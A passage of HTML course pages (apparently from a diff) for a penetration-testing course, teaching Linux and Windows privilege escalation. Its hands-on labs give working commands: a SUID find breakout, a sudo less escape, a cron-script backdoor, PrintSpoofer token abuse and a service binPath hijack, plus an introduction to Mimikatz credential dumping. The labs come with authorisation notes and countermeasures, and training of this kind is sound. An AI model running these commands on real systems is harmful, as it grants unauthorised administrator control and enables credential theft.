+      <div class="kicker"><span class="snum">S06 &middot; P07</span><span class="tag lab">Hands-on · everyone · the classic</span><span class="time">&#9201; 15 min</span></div>
+      <h1>Lab 1 &mdash; A SUID Binary Becomes a Root Shell</h1>
+      <p class="lede">The most common Linux privesc in the exam and the real world: find a SUID binary, look it up on GTFOBins, paste one line, become root.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>From your low-priv shell, find every SUID binary, spot one that should not be SUID (or is a known GTFOBins target), and use its documented one-liner to spawn a shell that runs as its owner &mdash; root. Ninety seconds of enumeration, one line of abuse.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>Your low-priv shell on the Linux lab target (or the capstone box later). The SUID misconfig is seeded for the lab &mdash; a real box may or may not have one, which is exactly why you enumerate.</p></div><ol class="steps">
+<li>
+<strong>Find the SUID binaries.</strong>
+<pre><code>find / -perm -4000 -type f 2>/dev/null
+# ... /usr/bin/find   <-- find should NOT normally be SUID</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">lowuser@target: ~</span><span class="sim-tool">find · SUID sweep</span></div>
+  <div class="sim-body">
+<span class="l cmd">find / -perm -4000 -type f 2>/dev/null</span>
+<span class="l dim">/usr/bin/passwd</span>
+<span class="l dim">/usr/bin/sudo</span>
+<span class="l dim">/usr/bin/mount</span>
+<span class="l hl">/usr/bin/find      <-- not normally SUID</span>
+<span class="l cmd">ls -la /usr/bin/find</span>
+<span class="l ok">-rwsr-xr-x 1 root root ...  /usr/bin/find</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>The s in -rw<u>s</u>r-xr-x</b> is the SUID bit &mdash; it runs as root.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A list of SUID binaries; one of them is a GTFOBins target (e.g. <span class="mono">find</span>, <span class="mono">cp</span>, <span class="mono">vim</span>, <span class="mono">env</span>, <span class="mono">nmap</span>)</li></ul></div>
+</li>
+<li>
+<strong>Look it up on GTFOBins</strong> and run the documented SUID one-liner.
+<pre><code># gtfobins.github.io/gtfobins/find/#suid
+/usr/bin/find . -exec /bin/sh -p \; -quit
+# the -p keeps the effective UID (root); you get a root shell</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">lowuser@target: ~</span><span class="sim-tool">GTFOBins · find SUID</span></div>
+  <div class="sim-body">
+<span class="l cmd">find . -exec /bin/sh -p \; -quit</span>
+<span class="l cmd root">id</span>
+<span class="l ok">uid=1000(lowuser) gid=1000(lowuser) euid=0(root)</span>
+<span class="l cmd root">whoami</span>
+<span class="l ok">root</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>-p</b> is the key: without it the shell drops the root euid.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You drop into a shell where <span class="mono">id</span> shows <strong>euid=0(root)</strong></li></ul></div>
+</li>
+<li>
+<strong>Verify and record.</strong>
+<pre><code>id            # euid=0(root)
+cat /root/root.txt   # proof / flag
+# stabilise a full root shell if needed:
+/usr/bin/find . -exec /bin/bash -p \; -quit</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">id</span> shows euid=0(root)</li><li>Engagement-report row: host, low-priv user, <strong>SUID find (GTFOBins) &rarr; root</strong>, proof</li></ul></div>
+</li>
+</ol><div class="box tip"><span class="box-t">If find is not the SUID one</span><p>The technique is identical for any GTFOBins SUID binary &mdash; look up whichever one your box has. <span class="mono">vim</span>, <span class="mono">nmap</span> (interactive mode), <span class="mono">env</span>, <span class="mono">cp</span> (overwrite /etc/passwd), <span class="mono">bash -p</span> &mdash; each has its own one-liner on the site.</p></div><div class="box key-takeaway"><span class="box-t">What you produced</span><p>Root from a single misconfigured binary and a lookup. This is the highest-frequency Linux privesc there is &mdash; and the countermeasure is one line too: <span class="mono">chmod -s</span> the binary, and never SUID a shell-capable program.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="sudo &amp; cron abuse">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P08</span><span class="tag theory">Method · scheduled root</span><span class="time">&#9201; 8 min</span></div>
+      <h1>When root Runs Your Script</h1>
+      <p class="lede">Two of the most reliable Linux privescs share one idea: a root process touches something <em>you</em> control. Step through it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why these two together</span><p>A <span class="mono">sudo</span> right you can break out of, and a cron job that runs a script you can write, are the same trick in two costumes: <strong>root executes code, and you decide what the code is.</strong> Step through the cron version &mdash; it is the clearest picture of the idea.</p></div>      <figure class="dgm pktflow"><figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Writable cron job abuse: a cron job runs as root every minute and executes a backup script; the low-privilege user can write that script, so they insert a payload that makes bash SUID; on the next run root executes it and the user gets a root shell.">
+          <rect x="105" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="230" y="54" text-anchor="middle" font-size="14" fill="var(--green)">Cron (as root)</text>
+          <text class="d-sub" x="230" y="70" text-anchor="middle">runs every minute</text>
+          <line x1="230" y1="80" x2="230" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="585" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="710" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">You (low-priv)</text>
+          <text class="d-sub" x="710" y="70" text-anchor="middle">can write the script</text>
+          <line x1="710" y1="80" x2="710" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">cron runs /opt/backup.sh as root, every minute</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:26px">
+          <text x="470" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">and /opt/backup.sh is WRITABLE by you</text>
+          <path d="M236,174 L704,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="470" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">you append a payload to the script</text>
+          <path d="M704,228 L236,228" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">next minute: root runs it &rarr; /bin/bash is now SUID</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:26px">
+          <text x="470" y="322" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">bash -p &rarr; root shell</text>
+          <path d="M236,336 L704,336" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>You found this in <span class="mono">/etc/crontab</span>. The job itself is normal &mdash; the problem is the file it runs.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span><span class="mono">ls -la /opt/backup.sh</span> shows it is world-writable (or owned by your group). That is the misconfiguration &mdash; root runs a file you control.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>e.g. <span class="mono">echo 'chmod +s /bin/bash' &gt;&gt; /opt/backup.sh</span> &mdash; or a reverse shell. You are just editing a file you can write.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Cron executes your line <em>as root</em>. Now <span class="mono">bash</span> carries the SUID bit set by root.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span><span class="mono">/bin/bash -p</span> keeps the root euid. You are root &mdash; because root ran your one line.</div>
+        </figure>        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; find the two things that matter</span><pre><code>sudo -l                          # can I run anything as root?
+cat /etc/crontab ; ls -la /etc/cron.*   # what does root run on a schedule?
+# then check if any script it runs is writable:
+find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys' | head</code></pre><p style="margin-top:8px"><b>You should see:</b> your sudo rights and root&#39;s scheduled scripts &mdash; and whether any of those scripts is writable by you. A writable root-run script is a guaranteed root shell (Lab 2).</p></div><div class="box key-takeaway"><span class="box-t">The pattern to recognise</span><p><strong class="hl hl-w">If root executes something you can change, you are root.</strong> Writable cron scripts, a sudo binary that breaks out (GTFOBins), a writable file root sources &mdash; all the same shape. Look for the crossing point between &quot;root runs it&quot; and &quot;I can write it.&quot;</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 2: sudo / cron &rarr; root">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P09</span><span class="tag lab">Hands-on · everyone</span><span class="time">&#9201; 14 min</span></div>
+      <h1>Lab 2 &mdash; Break Out of sudo, or Ride a cron Job</h1>
+      <p class="lede">Two paths to root on the same box: a sudo right you can break out of, and a writable script root runs on a schedule. Do at least one.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>Check <span class="mono">sudo -l</span> for a command you can break out of via GTFOBins, and check cron for a writable root-run script. Pick whichever your box offers and take it to root. Both are among the most common real-world Linux privescs.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>Your low-priv shell on the Linux lab target. The sudo/cron misconfig is seeded for the lab. Do not run these techniques anywhere you were not given.</p></div><ol class="steps">
+<li>
+<strong>Path A &mdash; sudo break-out.</strong> If <span class="mono">sudo -l</span> shows a GTFOBins binary, break out of it.
+<pre><code>sudo -l
+# (ALL) NOPASSWD: /usr/bin/less   <-- less is on GTFOBins
+sudo less /etc/profile
+# inside less, type:  !/bin/sh
+# => root shell</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">lowuser@target: ~</span><span class="sim-tool">sudo · GTFOBins break-out</span></div>
+  <div class="sim-body">
+<span class="l cmd">sudo -l</span>
+<span class="l dim">User lowuser may run the following commands:</span>
+<span class="l hl">    (ALL) NOPASSWD: /usr/bin/less</span>
+<span class="l cmd">sudo less /etc/profile</span>
+<span class="l dim">:!/bin/sh</span>
+<span class="l cmd root">id</span>
+<span class="l ok">uid=0(root) gid=0(root)</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>NOPASSWD + a GTFOBins binary = instant root.</b></span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">sudo less</span> (or your binary) breaks out to a shell where <span class="mono">id</span> = root</li></ul></div>
+</li>
+<li>
+<strong>Path B &mdash; writable cron.</strong> Find a writable script root runs, and plant a payload.
+<pre><code>cat /etc/crontab            # * * * * * root /opt/backup.sh
+ls -la /opt/backup.sh       # -rwxrwxrwx (writable!)
+echo 'chmod +s /bin/bash' >> /opt/backup.sh
+# wait one minute, then:
+/bin/bash -p                # euid=0</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>After the next cron run, <span class="mono">/bin/bash -p</span> gives a root shell (euid=0)</li></ul></div>
+</li>
+<li>
+<strong>Verify and record.</strong>
+<pre><code>id ; cat /root/root.txt
+# record WHICH path worked and the exact misconfig</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">id</span> = root via your chosen path</li><li>Engagement-report row: <strong>sudo less break-out</strong> or <strong>writable cron /opt/backup.sh</strong> &rarr; root</li></ul></div>
+</li>
+</ol><div class="box warn"><span class="box-t">The deliberate failure to notice</span><p>If the cron script is <em>not</em> writable, plan B fails silently &mdash; you wait a minute and nothing happens. That is the lesson: <b>confirm the misconfig (the writable bit) before you rely on it.</b> linPEAS flags candidates; the <span class="mono">ls -la</span> proves them.</p></div><div class="box key-takeaway"><span class="box-t">What you produced</span><p>Root by a second, independent path &mdash; and the habit of reading <span class="mono">sudo -l</span> and cron on every box. The countermeasure: least-privilege sudo, no NOPASSWD on break-out binaries, and never a world-writable script in root&#39;s cron.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Windows privesc surface">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P10</span><span class="tag theory">Method · where SYSTEM leaks</span><span class="time">&#9201; 8 min</span></div>
+      <h1>The Windows Privesc Surface &mdash; Where SYSTEM Leaks</h1>
+      <p class="lede">Different OS, same loop. Four categories give SYSTEM on Windows to a user who enumerated. winPEAS finds them; you judge them.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the Windows surface is its own map</span><p>Windows privesc looks nothing like Linux &mdash; no SUID, no sudo. Instead: <strong>services</strong> you can tamper with, <strong>token privileges</strong> you should not hold, <strong>installer policies</strong> left on, and <strong>credentials</strong> lying in files and memory. Learn the four and winPEAS output makes sense.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 200" role="img" aria-label="The Windows privilege escalation surface: service misconfigurations, token privileges, AlwaysInstallElevated, and stored credentials. Click each.">
+          <rect x="360" y="14" width="220" height="40" rx="9" fill="#1f2533" stroke="#e63946"/><text class="d-title" x="470" y="40" text-anchor="middle" font-size="14">low-priv user</text>
+          <g class="node" data-node="svc" tabindex="0"><rect x="30" y="86" width="270" height="50" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="165" y="108" text-anchor="middle" font-size="12.5">Service misconfigurations</text><text class="d-sub" x="165" y="125" text-anchor="middle">weak perms · unquoted path · weak binary</text></g>
+          <g class="node" data-node="tok" tabindex="0"><rect x="330" y="86" width="270" height="50" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="465" y="108" text-anchor="middle" font-size="12.5">Token privileges</text><text class="d-sub" x="465" y="125" text-anchor="middle">SeImpersonate · SeBackup · whoami /priv</text></g>
+          <g class="node" data-node="aie" tabindex="0"><rect x="630" y="86" width="290" height="50" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="775" y="108" text-anchor="middle" font-size="12.5">AlwaysInstallElevated</text><text class="d-sub" x="775" y="125" text-anchor="middle">any .msi runs as SYSTEM</text></g>
+          <g class="node" data-node="creds" tabindex="0"><rect x="230" y="150" width="470" height="42" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="465" y="170" text-anchor="middle" font-size="12.5">Stored credentials</text><text class="d-sub" x="465" y="186" text-anchor="middle">unattend.xml · registry · LSASS memory (Mimikatz)</text></g>
+          <path d="M430,56 L165,84" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M470,56 L465,84" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M510,56 L775,84" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; what to look for, and the command that finds it.</div>
+        <div class="dgm-detail" data-detail="svc"><h5><span class="dd-tag">SERVICES</span>Three ways a service gives SYSTEM</h5><p><b>Services run as SYSTEM. If you can change what one runs, you run as SYSTEM.</b> (1) <em>Weak service permissions</em> &mdash; you can reconfigure its binary path (<span class="mono">sc config</span>). (2) <em>Unquoted service path</em> with a space &mdash; drop a binary earlier in the path. (3) <em>Writable service binary</em> &mdash; replace the exe. Find them with winPEAS or <span class="mono">accesschk</span>. Lab 3.</p></div>
+        <div class="dgm-detail" data-detail="tok"><h5><span class="dd-tag">TOKENS</span>Privileges you should not hold</h5><p><b><span class="mono">whoami /priv</span> lists your token privileges.</b> <span class="mono">SeImpersonatePrivilege</span> (common on service accounts &mdash; IIS, MSSQL) lets a &quot;potato&quot; exploit impersonate a SYSTEM token. <span class="mono">SeBackupPrivilege</span> reads any file (the SAM). These are the fastest Windows privescs. Lab 3.</p></div>
+        <div class="dgm-detail" data-detail="aie"><h5><span class="dd-tag">AlwaysInstallElevated</span>Any MSI as SYSTEM</h5><p><b>If both registry keys are set to 1, any <span class="mono">.msi</span> installs as SYSTEM</b> &mdash; even one you built with msfvenom. <span class="mono">reg query HKLM\...\Installer /v AlwaysInstallElevated</span>. A whole-domain misconfiguration when pushed by GPO.</p></div>
+        <div class="dgm-detail" data-detail="creds"><h5><span class="dd-tag">STORED CREDS</span>Passwords left lying around</h5><p><b>Credentials in <span class="mono">unattend.xml</span>, the registry, saved RDP/PuTTY sessions, and &mdash; the big one &mdash; in <span class="mono">LSASS</span> memory.</b> <b>Mimikatz</b> dumps plaintext passwords, NT hashes and Kerberos tickets straight from LSASS. Lab 4. A dumped admin password often beats any exploit.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; map the Windows surface fast</span><pre><code>whoami /priv                 # token privileges (look for SeImpersonate)
+whoami /groups               # am I in a privileged group?
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p style="margin-top:8px"><b>You should see:</b> your token privileges and the AlwaysInstallElevated state in three lines. <span class="mono">SeImpersonatePrivilege</span> in that first output is a near-guaranteed SYSTEM (Lab 3).</p></div><div class="box key-takeaway"><span class="box-t">The Windows mindset</span><p><strong class="hl">On Windows you rarely &quot;exploit&quot; &mdash; you abuse a misconfiguration.</strong> A service you can edit, a token you should not have, a password left in a file. winPEAS finds them; GTFOBins&#39; Windows cousin is <b>LOLBAS</b> (lolbas-project.github.io).</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Token abuse">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P11</span><span class="tag theory">Method · SeImpersonate &rarr; SYSTEM</span><span class="time">&#9201; 8 min</span></div>
+      <h1>SeImpersonate &rarr; SYSTEM: the Potato Mechanism</h1>
+      <p class="lede">The most common Windows service-account privesc. Step through how a single token privilege becomes a SYSTEM shell.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why service accounts fall so often</span><p>Web and database services (IIS, MSSQL) run as accounts that hold <span class="mono">SeImpersonatePrivilege</span> &mdash; the right to impersonate a token handed to them. That is normal and necessary for how services work. But a <strong>potato</strong> exploit tricks a SYSTEM process into handing the service account a SYSTEM token &mdash; and the privilege lets it impersonate that token. Step through it.</p></div>      <figure class="dgm pktflow"><figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Potato token-abuse chain: the low-privilege service account holds SeImpersonatePrivilege; a potato exploit coerces a SYSTEM service to authenticate to a local listener; the SYSTEM token arrives; the service account impersonates it and spawns a SYSTEM process.">
+          <rect x="105" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="230" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">You (service acct)</text>
+          <text class="d-sub" x="230" y="70" text-anchor="middle">holds SeImpersonate</text>
+          <line x1="230" y1="80" x2="230" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="585" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="710" y="54" text-anchor="middle" font-size="14" fill="var(--green)">A SYSTEM service</text>
+          <text class="d-sub" x="710" y="70" text-anchor="middle">runs as SYSTEM</text>
+          <line x1="710" y1="80" x2="710" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">whoami /priv &rarr; SeImpersonatePrivilege = Enabled</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">potato coerces the SYSTEM service to authenticate to you</text>
+          <path d="M236,174 L704,174" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="470" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">the SYSTEM service hands over a SYSTEM token</text>
+          <path d="M704,228 L236,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--purple)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--purple)">you IMPERSONATE the SYSTEM token (that is what the privilege is for)</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">spawn cmd.exe as NT AUTHORITY\SYSTEM</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>You landed as a service account (IIS/MSSQL) with a low-priv shell. But it holds the one privilege that matters.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>PrintSpoofer / GodPotato tricks a SYSTEM-run service (the print spooler, DCOM) into connecting to a local named pipe you control.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>When it authenticates to your pipe, its <b>SYSTEM token</b> is exposed to you &mdash; the moment SeImpersonate was waiting for.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>SeImpersonatePrivilege is exactly the right to act with a token handed to you. The exploit uses it legitimately &mdash; on an illegitimately obtained token.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>The potato launches a process with the impersonated token. <span class="mono">whoami</span> = SYSTEM. One privilege, one exploit, full control.</div>
+        </figure>        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; check for the golden privilege</span><pre><code>whoami /priv | findstr /i "Impersonate Backup Restore TakeOwnership"
+# SeImpersonatePrivilege  Enabled   <-- potato time</code></pre><p style="margin-top:8px"><b>You should see:</b> if <span class="mono">SeImpersonatePrivilege</span> is Enabled you are almost certainly one PrintSpoofer/GodPotato away from SYSTEM &mdash; which is Lab 3.</p></div><div class="box note"><span class="box-t">The potato family (currency)</span><p><span class="mono">PrintSpoofer</span> and <span class="mono">GodPotato</span> are the current, reliable choices on modern Windows; the older <span class="mono">JuicyPotato</span> was patched out on Server 2019/Win10 1809+. Same idea, newer plumbing &mdash; check which the target build accepts.</p></div><div class="box key-takeaway"><span class="box-t">The rule</span><p><strong class="hl">A service account with SeImpersonate is not low-privilege &mdash; it is SYSTEM with an extra step.</strong> This is why so many web/DB compromises end in full host takeover: the shell you land as already holds the key.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 3: Windows &rarr; SYSTEM">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P12</span><span class="tag lab">Hands-on · everyone</span><span class="time">&#9201; 15 min</span></div>
+      <h1>Lab 3 &mdash; From a Low-Priv Windows Shell to SYSTEM</h1>
+      <p class="lede">Enumerate the Windows surface, then take the fastest path your box offers &mdash; a token privilege or a service misconfig &mdash; to SYSTEM.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you are about to do</span><p>From your low-priv Windows shell (the WIN10 foothold, or a capstone box), run winPEAS, then escalate by whichever route the box exposes: a potato on <span class="mono">SeImpersonate</span>, a weak/unquoted service, or AlwaysInstallElevated. Aim for <span class="mono">whoami</span> = SYSTEM.</p></div><div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>Your low-priv shell on WIN10-TGT01 (or a capstone box). The privesc route is seeded for the lab. Snapshot first &mdash; a broken service can need a revert.</p></div><ol class="steps">
+<li>
+<strong>Enumerate with winPEAS</strong> and read the red.
+<pre><code>wp.exe quiet cmd fast
+# look for: SeImpersonate, modifiable services, unquoted paths, AlwaysInstallElevated</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>winPEAS highlights at least one route (a token privilege, a service, or an installer policy)</li></ul></div>
+</li>
+<li>
+<strong>Route A &mdash; token (potato).</strong> If you hold SeImpersonate:
+<pre><code>whoami /priv | findstr Impersonate    # SeImpersonatePrivilege Enabled
+PrintSpoofer.exe -i -c cmd
+# or: GodPotato.exe -cmd "cmd /c whoami"</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">C:\Temp> (win10-tgt01)</span><span class="sim-tool">PrintSpoofer</span></div>
+  <div class="sim-body">
+<span class="l cmd">whoami /priv | findstr Impersonate</span>
+<span class="l ok">SeImpersonatePrivilege   Enabled</span>
+<span class="l cmd">PrintSpoofer.exe -i -c cmd</span>
+<span class="l dim">[+] Found privilege: SeImpersonatePrivilege</span>
+<span class="l dim">[+] Named pipe listening...</span>
+<span class="l ok">[+] CreateProcessAsUser() OK</span>
+<span class="l cmd">whoami</span>
+<span class="l ok">nt authority\system</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>One privilege &rarr; SYSTEM.</b> No exploit code &mdash; an abused feature.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A new shell / command runs as <strong>NT AUTHORITY\SYSTEM</strong></li></ul></div>
+</li>
+<li>
+<strong>Route B &mdash; weak service.</strong> If a service is reconfigurable:
+<pre><code>sc qc VulnSvc                         # BINARY_PATH_NAME + weak perms
+sc config VulnSvc binPath= "C:\Temp\rev.exe"
+sc stop VulnSvc & sc start VulnSvc     # runs your exe as SYSTEM</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The service runs your payload as SYSTEM (catch the shell / add an admin)</li></ul></div>
+</li>
+<li>
+<strong>Verify and record.</strong>
+<pre><code>whoami          # nt authority\system
+hostname
+# grab the flag / proof, then the SAM for good measure</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">whoami</span> = SYSTEM</li><li>Engagement-report row: host, route (potato / service / AIE), <strong>landed as SYSTEM</strong>, proof</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>SYSTEM on Windows &mdash; from a misconfiguration, not a CVE. On this host, privilege escalation is now complete; what remains is looting it, which is the next lab (Mimikatz).</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="winPEAS + Mimikatz">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P13</span><span class="tag theory">Tool group · loot the box</span><span class="time">&#9201; 9 min</span></div>
+      <h1>Once You&#39;re SYSTEM: Mimikatz and the Loot</h1>
+      <p class="lede">SYSTEM is not the end &mdash; it is the key to LSASS. Mimikatz turns SYSTEM on one box into credentials for the whole network.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why dumping credentials is the real prize</span><p>Being SYSTEM on one machine is control of that machine. But that machine&#39;s memory (LSASS) holds the <strong>plaintext passwords, NT hashes and Kerberos tickets</strong> of everyone who logged in &mdash; often including a domain admin. Mimikatz extracts them, and one of those credentials logs you into the <em>next</em> machine. This is how one foothold becomes a domain.</p></div>
+      <figure class="dgm pktflow"><figure class="dgm pktflow">
+          <svg viewBox="0 0 940 316" role="img" aria-label="Mimikatz LSASS dump: as SYSTEM you enable debug privilege, read the LSASS process memory, and extract plaintext passwords, NT hashes and Kerberos tickets of logged-on users.">
+          <rect x="105" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="230" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">You (SYSTEM)</text>
+          <text class="d-sub" x="230" y="70" text-anchor="middle">mimikatz</text>
+          <line x1="230" y1="80" x2="230" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="585" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="710" y="54" text-anchor="middle" font-size="14" fill="var(--green)">LSASS</text>
+          <text class="d-sub" x="710" y="70" text-anchor="middle">holds logged-on secrets</text>
+          <line x1="710" y1="80" x2="710" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">privilege::debug &mdash; enable SeDebugPrivilege</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
